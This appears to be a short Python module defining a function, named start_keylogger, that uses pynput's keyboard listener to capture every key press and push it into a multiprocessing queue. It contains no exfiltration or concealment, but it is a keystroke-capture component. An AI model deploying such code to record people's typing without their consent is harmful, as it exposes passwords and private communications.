from pynput import keyboard
from multiprocessing import Queue


def start_keylogger(queue: Queue):
    def on_press(key):
        queue.put(key)

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
